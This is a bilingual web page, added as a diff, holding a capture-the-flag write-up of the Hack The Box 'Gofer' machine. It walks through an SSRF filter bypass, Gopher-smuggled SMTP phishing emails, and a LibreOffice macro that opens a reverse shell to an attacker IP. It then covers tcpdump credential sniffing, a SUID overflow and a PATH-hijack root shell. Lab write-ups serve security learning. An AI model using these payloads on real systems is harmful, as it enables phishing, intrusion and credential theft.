@@ -1,0 +1,858 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>gofer | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">gofer</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-hard">hard</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The attack began by discovering an SMB share with anonymous access containing an email that revealed critical information about the organization's security practices. The email disclosed that user Jocelyn was susceptible to phishing attacks and preferred <code>.odt</code> files, while also hinting at a potential security misconfiguration in the proxy virtual host.</p>
+
+                    <p>By exploiting a bypass in the HTTP method restrictions on <code>proxy.gofer.htb</code>, I gained access to an internal proxy service that was vulnerable to SSRF. Leveraging the Gopher protocol through this proxy, I was able to interact with the internal SMTP service on port 25, sending a phishing email to Jocelyn with a malicious LibreOffice <code>.odt</code> document containing a macro-based reverse shell payload.</p>
+
+                    <p>Once initial access was obtained as user <code>jhudson</code>, I discovered that <code>tcpdump</code> had the <code>cap_net_admin</code> capability enabled, allowing packet capture without root privileges. By sniffing network traffic, I intercepted HTTP Basic Authentication credentials for user <code>tbuckley</code>, enabling lateral movement.</p>
+
+                    <p>As <code>tbuckley</code>, I gained access to a custom SUID binary called <code>notes</code> that was vulnerable to a buffer overflow condition. By exploiting this vulnerability, I was able to overflow the username field into the role field, setting my role to "admin" and unlocking a backup functionality. This backup feature called the <code>tar</code> command without using an absolute path, making it vulnerable to PATH hijacking. By creating a malicious <code>tar</code> script in a controlled directory and modifying the PATH environment variable, I achieved privilege escalation to root.</p>
+
+                    <p><strong>Technologies/Exploits:</strong> SMB enumeration, HTTP method bypass, SSRF via Gopher protocol, SMTP manipulation, LibreOffice macro payload, packet sniffing with tcpdump (cap_net_admin abuse), buffer overflow exploitation, SUID binary PATH hijacking.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an nmap scan to identify open ports and services running on the target machine:</p>
+                <p><img src="./media/image2.png" alt="Nmap scan results showing open ports including SSH on 22, HTTP on 80, SMB on 139 and 445, and various other services" /></p>
+
+                <p>The scan reveals several interesting services. I add <code>gofer.htb</code> to my <code>/etc/hosts</code> file for easier access. Port 80 is running an HTTP server, and ports 139 and 445 indicate SMB services are available.</p>
+
+                <h2>Web Enumeration - Virtual Host Discovery</h2>
+                <p>Running <code>whatweb</code> provides some basic information about the web server, revealing it's running Apache 2.4.56 on Debian with an email address <code>info@gofer.htb</code>. The technology stack includes Bootstrap, HTML5, and Lightbox.</p>
+
+                <p>Using <code>gobuster</code> for virtual host enumeration, I discover an interesting subdomain:</p>
+                <pre><code class="language-bash">gobuster vhost -u http://gofer.htb -w wordlist.txt</code></pre>
+
+                <p>The scan reveals <code>proxy.gofer.htb</code> returning a 401 status code, indicating authentication is required. I add this to my <code>/etc/hosts</code> file and attempt to access it:</p>
+                <p><img src="./media/image5.png" alt="Browser showing HTTP Basic Authentication prompt for proxy.gofer.htb requiring username and password" /></p>
+
+                <p>The proxy virtual host requires HTTP Basic Authentication. I try some default credentials without success. Further directory enumeration on the main site reveals:</p>
+                <pre><code class="language-plaintext">/assets (Status: 301)
+/index.html (Status: 200)
+/server-status (Status: 403)</code></pre>
+
+                <p>The <code>/assets</code> directory has directory listing enabled:</p>
+                <p><img src="./media/image1.png" alt="Directory listing of /assets showing various CSS, JavaScript, and image files" /></p>
+
+                <p>However, nothing immediately exploitable is found in the web assets. With no clear path forward on the web application, I shift focus to the SMB services.</p>
+
+                <h2>SMB Enumeration - Discovering Credentials</h2>
+                <p>Testing for anonymous SMB access with <code>smbmap</code>:</p>
+                <pre><code class="language-bash">smbmap -H gofer.htb</code></pre>
+
+                <p>The output reveals a readable share:</p>
+                <pre><code class="language-plaintext">Disk         Permissions    Comment
+----         -----------    -------
+print$       NO ACCESS      Printer Drivers
+shares       READ ONLY
+IPC$         NO ACCESS      IPC Service (Samba 4.13.13-Debian)</code></pre>
+
+                <p>Connecting to the <code>shares</code> SMB share anonymously:</p>
+                <pre><code class="language-bash">smbclient //gofer.htb/shares -N</code></pre>
+
+                <p>Inside the share, I find a hidden <code>.backup</code> directory containing a file named <code>mail</code>:</p>
+                <pre><code class="language-plaintext">smb: \> ls
+  .                D        0  Fri Oct 28 20:32:08 2022
+  ..               D        0  Fri Apr 28 12:59:34 2023
+  .backup         DH        0  Thu Apr 27 13:49:32 2023
+
+smb: \> cd .backup
+smb: \.backup\> ls
+  .                D        0  Thu Apr 27 13:49:32 2023
+  ..               D        0  Fri Oct 28 20:32:08 2022
+  mail             N     1101  Thu Apr 27 13:49:32 2023
+
+smb: \.backup\> get mail</code></pre>
+
+                <h3>Analyzing the Email</h3>
+                <p>The recovered email contains valuable intelligence:</p>
+                <pre><code class="language-plaintext">From jdavis@gofer.htb Fri Oct 28 20:29:30 2022
+Return-Path: &lt;jdavis@gofer.htb&gt;
+X-Original-To: tbuckley@gofer.htb
+Delivered-To: tbuckley@gofer.htb
+
+Subject: Important to read!
+From: jdavis@gofer.htb
+
+Hello guys,
+
+Our dear Jocelyn received another phishing attempt last week and his habit of 
+clicking on links without paying much attention may be problematic one day. 
+That's why from now on, I've decided that important documents will only be 
+sent internally, by mail, which should greatly limit the risks. If possible, 
+use an .odt format, as documents saved in Office Word are not always well 
+interpreted by Libreoffice.
+
+PS: Last thing for Tom; I know you're working on our web proxy but if you 
+could restrict access, it will be more secure until you have finished it. 
+It seems to me that it should be possible to do so via &lt;Limit&gt;</code></pre>
+
+                <p>This email reveals several critical pieces of information:</p>
+                <ul>
+                    <li><strong>Jocelyn (jhudson)</strong> is susceptible to phishing attacks and tends to click links without careful examination</li>
+                    <li><strong>Tom (tbuckley)</strong> is the developer of the proxy virtual host at <code>proxy.gofer.htb</code></li>
+                    <li>The proxy may be improperly secured using only Apache's <code>&lt;Limit&gt;</code> directive, potentially allowing HTTP method bypasses</li>
+                    <li>The organization prefers <code>.odt</code> (LibreOffice) file format over Microsoft Office formats</li>
+                </ul>
+
+                <h2>Exploiting the Proxy - HTTP Method Bypass</h2>
+                <p>The email's mention of <code>&lt;Limit&gt;</code> suggests the proxy might only restrict certain HTTP methods like GET. I test this hypothesis using <code>feroxbuster</code> with multiple HTTP methods:</p>
+                <pre><code class="language-bash">feroxbuster --url http://proxy.gofer.htb \
+  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
+  -t 200 -x html,php -m GET,POST,PUT,OPTIONS,CONNECT</code></pre>
+
+                <p>The results confirm the bypass:</p>
+                <pre><code class="language-plaintext">200 POST    2l   10w   81c http://proxy.gofer.htb/index.php
+200 PUT     2l   10w   81c http://proxy.gofer.htb/index.php
+200 OPTIONS 2l   10w   81c http://proxy.gofer.htb/index.php</code></pre>
+
+                <p>While GET requests require authentication, POST, PUT, and OPTIONS methods work without credentials! Testing with POST:</p>
+                <pre><code class="language-bash">curl -X POST http://proxy.gofer.htb/index.php</code></pre>
+
+                <p>Response:</p>
+                <pre><code class="language-html">&lt;!-- Welcome to Gofer proxy --&gt;
+&lt;html&gt;&lt;body&gt;Missing URL parameter !&lt;/body&gt;&lt;/html&gt;</code></pre>
+
+                <p>The proxy expects a URL parameter. Since it's designed as a proxy service, I test with a target URL:</p>
+                <pre><code class="language-bash">curl -X POST "http://proxy.gofer.htb/index.php?url=http://gofer.htb"</code></pre>
+
+                <p>Success! The proxy fetches and returns the content from <code>gofer.htb</code>. This is a classic Server-Side Request Forgery (SSRF) vulnerability.</p>
+
+                <h3>Testing SSRF Limitations</h3>
+                <p>I attempt to target internal services, but discover filtering is in place:</p>
+                <pre><code class="language-bash">curl -X POST "http://proxy.gofer.htb/index.php?url=http://localhost"</code></pre>
+                <pre><code class="language-html">&lt;html&gt;&lt;body&gt;Blacklisted keyword: localhost !&lt;/body&gt;&lt;/html&gt;</code></pre>
+
+                <pre><code class="language-bash">curl -X POST "http://proxy.gofer.htb/index.php?url=http://127.0.0.1"</code></pre>
+                <pre><code class="language-html">&lt;html&gt;&lt;body&gt;Blacklisted keyword: /127 !&lt;/body&gt;&lt;/html&gt;</code></pre>
+
+                <p>However, the filter can be bypassed using <code>0.0.0.0</code>:</p>
+                <pre><code class="language-bash">curl -X POST "http://proxy.gofer.htb/index.php?url=http://0.0.0.0"</code></pre>
+
+                <p>This works and returns content from the local machine.</p>
+
+                <h2>Gopher Protocol Abuse - SMTP Interaction</h2>
+                <p>To leverage this SSRF vulnerability for phishing, I need to interact with the internal SMTP service on port 25. The <strong>Gopher protocol</strong> is perfect for this, as it allows sending arbitrary data to TCP services.</p>
+
+                <p>Testing Gopher access to SMTP:</p>
+                <pre><code class="language-bash">curl -X POST "http://proxy.gofer.htb/index.php?url=gopher://gofer.htb:25/_QUIT%250d%250a"</code></pre>
+
+                <p>Response:</p>
+                <pre><code class="language-plaintext">&lt;!-- Welcome to Gofer proxy --&gt;
+220 gofer.htb ESMTP Postfix (Debian/GNU)
+221 2.0.0 Bye</code></pre>
+
+                <p>Excellent! I can interact with the SMTP service. Now I craft a phishing email using proper SMTP syntax. According to SMTP protocol specifications, a complete email transaction requires:</p>
+                <ul>
+                    <li><code>HELO</code> - Initiate connection</li>
+                    <li><code>MAIL FROM</code> - Specify sender</li>
+                    <li><code>RCPT TO</code> - Specify recipient</li>
+                    <li><code>DATA</code> - Begin message content</li>
+                    <li>Message headers and body</li>
+                    <li><code>.</code> - End message (single dot on a line)</li>
+                    <li><code>QUIT</code> - Close connection</li>
+                </ul>
+
+                <h3>Testing Email Delivery</h3>
+                <p>First, I test with a simple HTTP callback to confirm Jocelyn will click links:</p>
+                <pre><code class="language-plaintext">HELO xd
+MAIL FROM:xd@gofer.htb
+RCPT TO:jhudson@gofer.htb
+DATA
+Subject: Please click immediately!
+Message: Hello Jocelyn,
+
+Please visit the following ASAP! http://10.10.16.2
+
+.
+QUIT</code></pre>
+
+                <p>URL-encoding this for the Gopher payload (CRLF = <code>%250d%250a</code>):</p>
+                <pre><code class="language-bash">curl -X POST 'http://proxy.gofer.htb/index.php?url=gopher://gofer.htb:25/_HELO%20xd%250d%250aMAIL%20FROM:xd@gofer.htb%250d%250aRCPT%20TO:jhudson@gofer.htb%250d%250aDATA%250d%250aSubject:%20Please%20click%20immediately!%250d%250aMessage:%20Hello%20Jocelyn,%250d%250aPlease%20visit%20the%20following%20ASAP!%20http://10.10.16.2%250d%250a.%250d%250aQUIT'</code></pre>
+
+                <p>The SMTP server confirms the email was queued:</p>
+                <pre><code class="language-plaintext">220 gofer.htb ESMTP Postfix (Debian/GNU)
+250 gofer.htb
+250 2.1.0 Ok
+250 2.1.5 Ok
+354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;
+250 2.0.0 Ok: queued as C48928150
+221 2.0.0 Bye</code></pre>
+
+                <p>Shortly after, my HTTP server receives a request from the target, confirming Jocelyn clicked the link:</p>
+                <pre><code class="language-plaintext">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.225 - - "GET /xd HTTP/1.1" 404 -</code></pre>
+
+                <h2>Initial Access - Malicious ODT Macro</h2>
+                <p>With confirmed phishing success, I now craft a malicious LibreOffice <code>.odt</code> document containing a macro-based reverse shell payload.</p>
+
+                <h3>Creating the Macro Payload</h3>
+                <p>In LibreOffice Writer, I navigate to <strong>Tools → Macros → Organize Macros → Basic...</strong> and create a new macro for my document:</p>
+                <p><img src="./media/image3.png" alt="LibreOffice Basic macro editor showing a reverse shell payload using Shell() function to execute bash -c with a base64-encoded reverse shell command" /></p>
+
+                <p>The macro contains a simple reverse shell command that will connect back to my attacking machine:</p>
+                <pre><code class="language-vbscript">Sub Main
+    Shell("bash -c 'bash -i >& /dev/tcp/10.10.16.2/443 0>&1'")
+End Sub</code></pre>
+
+                <p>Next, I configure the macro to execute automatically when the document is opened. In <strong>Tools → Customize...</strong>, under the <strong>Events</strong> tab, I assign the macro to the <strong>Open Document</strong> event:</p>
+                <p><img src="./media/image4.png" alt="LibreOffice Customize dialog showing the Events tab with the Open Document event configured to run the malicious macro" /></p>
+
+                <p>I save the document as <code>xd.odt</code> and prepare my attack infrastructure.</p>
+
+                <h3>Delivering the Payload</h3>
+                <p>Setting up listeners and the HTTP server to host the malicious document:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+                <pre><code class="language-bash">sudo python3 -m http.server 80</code></pre>
+
+                <p>Sending the phishing email with the malicious document link:</p>
+                <pre><code class="language-bash">curl -X POST 'http://proxy.gofer.htb/index.php?url=gopher://gofer.htb:25/_HELO%20xd%250d%250aMAIL%20FROM:xd@gofer.htb%250d%250aRCPT%20TO:jhudson@gofer.htb%250d%250aDATA%250d%250aSubject:%20Please%20click%20immediately!%250d%250aMessage:%20Hello%20Jocelyn,%250d%250aPlease%20visit%20the%20following%20ASAP!%20http://10.10.16.2/xd.odt%250d%250a.%250d%250aQUIT'</code></pre>
+
+                <p>The email is successfully queued. Shortly after, Jocelyn downloads the malicious document:</p>
+                <pre><code class="language-plaintext">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.225 - - "GET /xd.odt HTTP/1.1" 200 -</code></pre>
+
+                <p>And the reverse shell connects back as user <code>jhudson</code>:</p>
+                <pre><code class="language-bash">listening on [any] 443 ...
+connect to [10.10.16.2] from (UNKNOWN) [10.10.11.225] 47592
+bash: cannot set terminal process group (88261): Inappropriate ioctl for device
+bash: no job control in this shell
+bash: /home/jhudson/.bashrc: Permission denied
+jhudson@gofer:~$</code></pre>
+
+                <p>I now have initial access as <code>jhudson</code> and can retrieve the user flag.</p>
+
+                <h2>Post-Exploitation Enumeration</h2>
+                <p>After gaining initial access, I begin enumerating the system for privilege escalation vectors. I discover an unusual SUID binary:</p>
+                <pre><code class="language-bash">find / -perm -4000 2>/dev/null</code></pre>
+                <pre><code class="language-plaintext">/usr/local/bin/notes</code></pre>
+
+                <p>However, I don't have permission to execute it yet:</p>
+                <pre><code class="language-bash">ls -la /usr/local/bin/notes</code></pre>
+                <pre><code class="language-plaintext">-rwsr-s--- 1 root dev 17168 Apr 28 2023 /usr/local/bin/notes</code></pre>
+
+                <p>The binary belongs to the <code>dev</code> group. Checking my current groups:</p>
+                <pre><code class="language-bash">id</code></pre>
+                <pre><code class="language-plaintext">uid=1000(jhudson) gid=1000(jhudson) groups=1000(jhudson),108(netdev)</code></pre>
+
+                <p>I'm in the <code>netdev</code> group, which is interesting. Checking other users on the system:</p>
+                <pre><code class="language-bash">ls -la /home</code></pre>
+                <pre><code class="language-plaintext">drwxr-xr-x 2 ablake ablake 4096 Jul 19 2023 ablake
+drwxr-xr-x 2 jdavis jdavis 4096 Jul 19 2023 jdavis
+drwxr-xr-x 6 jhudson jhudson 4096 Jul 26 2023 jhudson
+drwxr-xr-x 3 tbuckley tbuckley 4096 Jul 19 2023 tbuckley</code></pre>
+
+                <p>User <code>tbuckley</code> might be in the <code>dev</code> group:</p>
+                <pre><code class="language-bash">id tbuckley</code></pre>
+                <pre><code class="language-plaintext">uid=1002(tbuckley) gid=1002(tbuckley) groups=1002(tbuckley),1004(dev)</code></pre>
+
+                <p>Confirmed! I need to move laterally to <code>tbuckley</code> to interact with the <code>notes</code> binary.</p>
+
+                <h2>Lateral Movement - Packet Sniffing with tcpdump</h2>
+                <p>The <code>netdev</code> group membership is significant. I check for binaries with special capabilities, though <code>getcap</code> isn't in the default PATH for non-root users on Debian:</p>
+                <pre><code class="language-bash">find / -name "*getcap*" 2>/dev/null</code></pre>
+                <pre><code class="language-plaintext">/usr/sbin/getcap
+/usr/share/man/man8/getcap.8.gz</code></pre>
+
+                <p>Running <code>getcap</code> with the full path:</p>
+                <pre><code class="language-bash">/usr/sbin/getcap -r / 2>/dev/null</code></pre>
+                <pre><code class="language-plaintext">/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
+/usr/bin/ping cap_net_raw=ep
+/usr/bin/tcpdump cap_net_admin,cap_net_raw=eip</code></pre>
+
+                <p>Perfect! <code>tcpdump</code> has <code>cap_net_admin</code> and <code>cap_net_raw</code> capabilities, allowing any user to capture network traffic. This is a prime target for credential sniffing.</p>
+
+                <h3>Capturing HTTP Traffic</h3>
+                <p>I start capturing traffic, filtering out my own connection and focusing on TCP:</p>
+                <pre><code class="language-bash">tcpdump -i any -nqt not host 10.10.16.2 and tcp</code></pre>
+
+                <p>This shows some traffic, but I need to see the actual packet contents. I refine the capture to show HTTP GET requests with ASCII output:</p>
+                <pre><code class="language-bash">tcpdump -i any -nn -A 'tcp port 80 and (tcp[((tcp[12:1] & 0xF0) >> 2):4] = 0x47455420)'</code></pre>
+
+                <p>This BPF filter specifically captures HTTP GET requests (0x47455420 = "GET " in hex). After a short wait, I capture interesting traffic:</p>
+                <pre><code class="language-plaintext">19:02:01.106397 lo In IP 127.0.0.1.36924 > 127.0.0.1.80: Flags [P.], seq 290690002:290690165, ack 3882088699, win 512, options [nop,nop,TS val 1343953880 ecr 1343953880], length 163: HTTP: GET /?url=http://gofer.htb HTTP/1.1
+
+GET /?url=http://gofer.htb HTTP/1.1
+Host: proxy.gofer.htb
+Authorization: Basic dGJ1Y2tsZXk6b29QNGRpZXRpZTNvX2hxdWFldGk=
+User-Agent: curl/7.74.0
+Accept: */*</code></pre>
+
+                <p>Excellent! I've captured an HTTP Authorization header with Basic authentication credentials. Decoding the base64 string:</p>
+                <pre><code class="language-bash">echo "dGJ1Y2tsZXk6b29QNGRpZXRpZTNvX2hxdWFldGk=" | base64 -d</code></pre>
+                <pre><code class="language-plaintext">tbuckley:ooP4dietie3o_hquaeti</code></pre>
+
+                <p>These credentials are valid! I can now switch to user <code>tbuckley</code>:</p>
+                <pre><code class="language-bash">su tbuckley</code></pre>
+
+                <h2>Binary Exploitation - Buffer Overflow in notes</h2>
+                <p>As <code>tbuckley</code>, I can now execute the SUID binary <code>notes</code>:</p>
+                <pre><code class="language-bash">/usr/local/bin/notes</code></pre>
+                <pre><code class="language-plaintext">========================================
+1) Create an user and choose an username
+2) Show user information
+3) Delete an user
+4) Write a note
+5) Show a note
+6) Save a note (not yet implemented)
+7) Delete a note
+8) Backup notes
+9) Quit
+========================================
+
+Your choice:</code></pre>
+
+                <p>The program appears to be a simple note-taking application. Option 8 (Backup notes) is particularly interesting:</p>
+                <pre><code class="language-plaintext">Your choice: 8
+Access denied: you don't have the admin role!</code></pre>
+
+                <p>To analyze this binary more thoroughly, I transfer it to my local machine for reverse engineering with Ghidra.</p>
+
+                <h3>Analyzing with Ghidra</h3>
+                <p>After decompiling the binary in Ghidra, I find the relevant code for option 8:</p>
+                <pre><code class="language-c">case 8:
+    if (local_10 == (void *)0x0) {
+        puts("First create an user!\n");
+    }
+    else {
+        iVar2 = strcmp((char *)((long)local_10 + 0x18),"admin");
+        if (iVar2 == 0) {
+            puts("Access granted!");
+            setuid(0);
+            setgid(0);
+            system("tar -czvf /root/backups/backup_notes.tar.gz /opt/notes");
+        }
+        else {
+            puts("Access denied: you don't have the admin role!\n");
+        }
+    }
+</code></pre>
+
+                <p>The backup function checks if the user's role (at offset <code>local_10 + 0x18</code>) equals "admin". If so, it sets UID and GID to 0 (root) and executes a <code>tar</code> command.</p>
+
+                <p>More importantly, I notice something suspicious: when I delete a user (option 3), the username is cleared but the memory isn't properly sanitized. When I then create a note (option 4), the note content might overflow into the role field.</p>
+
+                <h3>Exploiting the Buffer Overflow</h3>
+                <p>To determine the exact offset where the username ends and the role begins, I use Metasploit's pattern generator:</p>
+                <pre><code class="language-bash">msf-pattern_create -l 30</code></pre>
+                <pre><code class="language-plaintext">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9</code></pre>
+
+                <p>Testing the overflow:</p>
+                <ol>
+                    <li>Create a user</li>
+                    <li>Delete the user</li>
+                    <li>Write a note with the pattern: <code>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9</code></li>
+                    <li>Show user information</li>
+                </ol>
+
+                <pre><code class="language-plaintext">Your choice: 5
+Note: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9
+
+Your choice: 2
+Username: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9
+Role: Aa8Aa9</code></pre>
+
+                <p>Perfect! The role field starts at offset 24. I can now craft a note that places "admin" exactly in the role field:</p>
+                <pre><code class="language-plaintext">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7admin</code></pre>
+
+                <p>Following the same process (create user, delete user, write note with crafted payload):</p>
+                <pre><code class="language-plaintext">Your choice: 2
+Username: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7admin
+Role: admin</code></pre>
+
+                <p>Now I can access option 8:</p>
+                <pre><code class="language-plaintext">Your choice: 8
+Access granted!
+tar: Removing leading `/' from member names
+/opt/notes/</code></pre>
+
+                <h2>Privilege Escalation - PATH Hijacking</h2>
+                <p>The backup function successfully executes, but more importantly, I notice it calls <code>tar</code> without an absolute path:</p>
+                <pre><code class="language-c">system("tar -czvf /root/backups/backup_notes.tar.gz /opt/notes");</code></pre>
+
+                <p>Since the binary runs with <code>setuid(0)</code> and doesn't sanitize the environment, I can exploit this via PATH hijacking. Unlike <code>sudo</code>, which resets the environment by default, this SUID binary preserves the user's PATH.</p>
+
+                <h3>Executing the PATH Hijack</h3>
+                <p>First, I modify my PATH to prioritize the current directory:</p>
+                <pre><code class="language-bash">export PATH=.:$PATH
+echo $PATH</code></pre>
+                <pre><code class="language-plaintext">.:/tmp:/usr/bin:/bin</code></pre>
+
+                <p>Creating a malicious <code>tar</code> script in my working directory (<code>/tmp</code>):</p>
+                <pre><code class="language-bash">cat > /tmp/tar << 'EOF'
+#!/bin/bash
+bash -i
+EOF
+chmod +x /tmp/tar</code></pre>
+
+                <p>Now I return to the <code>notes</code> binary and repeat the exploitation process:</p>
+                <ol>
+                    <li>Create a user</li>
+                    <li>Delete the user</li>
+                    <li>Write a note: <code>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7admin</code></li>
+                    <li>Select option 8 (Backup notes)</li>
+                </ol>
+
+                <pre><code class="language-plaintext">Your choice: 8
+Access granted!
+root@gofer:/tmp#</code></pre>
+
+                <p>Success! The binary executes my malicious <code>tar</code> script instead of the system's <code>tar</code>, granting me a root shell. I can now retrieve the root flag and complete the machine.</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> El ataque comenzó descubriendo un recurso compartido SMB con acceso anónimo que contenía un correo electrónico revelando información crítica sobre las prácticas de seguridad de la organización. El correo desvelaba que el usuario Jocelyn era susceptible a ataques de phishing y prefería archivos <code>.odt</code>, mientras que también insinuaba una potencial mala configuración de seguridad en el virtual host del proxy.</p>
+
+                    <p>Explotando un bypass en las restricciones de métodos HTTP en <code>proxy.gofer.htb</code>, obtuve acceso a un servicio de proxy interno vulnerable a SSRF. Aprovechando el protocolo Gopher a través de este proxy, pude interactuar con el servicio SMTP interno en el puerto 25, enviando un correo de phishing a Jocelyn con un documento <code>.odt</code> malicioso de LibreOffice conteniendo un payload de reverse shell basado en macros.</p>
+
+                    <p>Una vez obtenido el acceso inicial como usuario <code>jhudson</code>, descubrí que <code>tcpdump</code> tenía habilitada la capability <code>cap_net_admin</code>, permitiendo la captura de paquetes sin privilegios de root. Mediante sniffing de tráfico de red, intercepté credenciales de autenticación HTTP Basic del usuario <code>tbuckley</code>, posibilitando el movimiento lateral.</p>
+
+                    <p>Como <code>tbuckley</code>, obtuve acceso a un binario SUID personalizado llamado <code>notes</code> que era vulnerable a una condición de desbordamiento de búfer. Explotando esta vulnerabilidad, pude desbordar el campo de nombre de usuario hacia el campo de rol, estableciendo mi rol como "admin" y desbloqueando una funcionalidad de backup. Esta función de backup llamaba al comando <code>tar</code> sin usar una ruta absoluta, haciéndolo vulnerable a secuestro de PATH. Creando un script <code>tar</code> malicioso en un directorio controlado y modificando la variable de entorno PATH, conseguí escalar privilegios a root.</p>
+
+                    <p><strong>Tecnologías/Exploits:</strong> Enumeración SMB, bypass de métodos HTTP, SSRF mediante protocolo Gopher, manipulación SMTP, payload de macros LibreOffice, sniffing de paquetes con tcpdump (abuso de cap_net_admin), explotación de desbordamiento de búfer, secuestro de PATH en binario SUID.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios ejecutándose en la máquina objetivo:</p>
+                <p><img src="./media/image2.png" alt="Resultados del escaneo de nmap mostrando puertos abiertos incluyendo SSH en el 22, HTTP en el 80, SMB en el 139 y 445, y varios otros servicios" /></p>
+
+                <p>El escaneo revela varios servicios interesantes. Añado <code>gofer.htb</code> a mi archivo <code>/etc/hosts</code> para un acceso más fácil. El puerto 80 ejecuta un servidor HTTP, y los puertos 139 y 445 indican que hay servicios SMB disponibles.</p>
+
+                <h2>Enumeración Web - Descubrimiento de Virtual Host</h2>
+                <p>Ejecutando <code>whatweb</code> proporciona información básica sobre el servidor web, revelando que ejecuta Apache 2.4.56 en Debian con una dirección de correo <code>info@gofer.htb</code>. El stack tecnológico incluye Bootstrap, HTML5 y Lightbox.</p>
+
+                <p>Usando <code>gobuster</code> para enumeración de virtual hosts, descubro un subdominio interesante:</p>
+                <pre><code class="language-bash">gobuster vhost -u http://gofer.htb -w wordlist.txt</code></pre>
+
+                <p>El escaneo revela <code>proxy.gofer.htb</code> devolviendo un código de estado 401, indicando que se requiere autenticación. Lo añado a mi archivo <code>/etc/hosts</code> e intento acceder:</p>
+                <p><img src="./media/image5.png" alt="Navegador mostrando el prompt de autenticación HTTP Basic para proxy.gofer.htb requiriendo usuario y contraseña" /></p>
+
+                <p>El virtual host del proxy requiere autenticación HTTP Basic. Pruebo algunas credenciales por defecto sin éxito. Una enumeración de directorios adicional en el sitio principal revela:</p>
+                <pre><code class="language-plaintext">/assets (Status: 301)
+/index.html (Status: 200)
+/server-status (Status: 403)</code></pre>
+
+                <p>El directorio <code>/assets</code> tiene directory listing habilitado:</p>
+                <p><img src="./media/image1.png" alt="Listado de directorio de /assets mostrando varios archivos CSS, JavaScript e imágenes" /></p>
+
+                <p>Sin embargo, no encuentro nada inmediatamente explotable en los assets web. Sin un camino claro en la aplicación web, cambio el foco a los servicios SMB.</p>
+
+                <h2>Enumeración SMB - Descubrimiento de Credenciales</h2>
+                <p>Probando acceso SMB anónimo con <code>smbmap</code>:</p>
+                <pre><code class="language-bash">smbmap -H gofer.htb</code></pre>
+
+                <p>La salida revela un recurso compartido legible:</p>
+                <pre><code class="language-plaintext">Disk         Permissions    Comment
+----         -----------    -------
+print$       NO ACCESS      Printer Drivers
+shares       READ ONLY
+IPC$         NO ACCESS      IPC Service (Samba 4.13.13-Debian)</code></pre>
+
+                <p>Conectándome al recurso compartido <code>shares</code> de forma anónima:</p>
+                <pre><code class="language-bash">smbclient //gofer.htb/shares -N</code></pre>
+
+                <p>Dentro del recurso compartido, encuentro un directorio oculto <code>.backup</code> que contiene un archivo llamado <code>mail</code>:</p>
+                <pre><code class="language-plaintext">smb: \> ls
+  .                D        0  Fri Oct 28 20:32:08 2022
+  ..               D        0  Fri Apr 28 12:59:34 2023
+  .backup         DH        0  Thu Apr 27 13:49:32 2023
+
+smb: \> cd .backup
+smb: \.backup\> ls
+  .                D        0  Thu Apr 27 13:49:32 2023
+  ..               D        0  Fri Oct 28 20:32:08 2022
+  mail             N     1101  Thu Apr 27 13:49:32 2023
+
+smb: \.backup\> get mail</code></pre>
+
+                <h3>Analizando el Correo Electrónico</h3>
+                <p>El correo electrónico recuperado contiene inteligencia valiosa:</p>
+                <pre><code class="language-plaintext">From jdavis@gofer.htb Fri Oct 28 20:29:30 2022
+Return-Path: &lt;jdavis@gofer.htb&gt;
+X-Original-To: tbuckley@gofer.htb
+Delivered-To: tbuckley@gofer.htb
+
+Subject: Important to read!
+From: jdavis@gofer.htb
+
+Hello guys,
+
+Our dear Jocelyn received another phishing attempt last week and his habit of 
+clicking on links without paying much attention may be problematic one day. 
+That's why from now on, I've decided that important documents will only be 
+sent internally, by mail, which should greatly limit the risks. If possible, 
+use an .odt format, as documents saved in Office Word are not always well 
+interpreted by Libreoffice.
+
+PS: Last thing for Tom; I know you're working on our web proxy but if you 
+could restrict access, it will be more secure until you have finished it. 
+It seems to me that it should be possible to do so via &lt;Limit&gt;</code></pre>
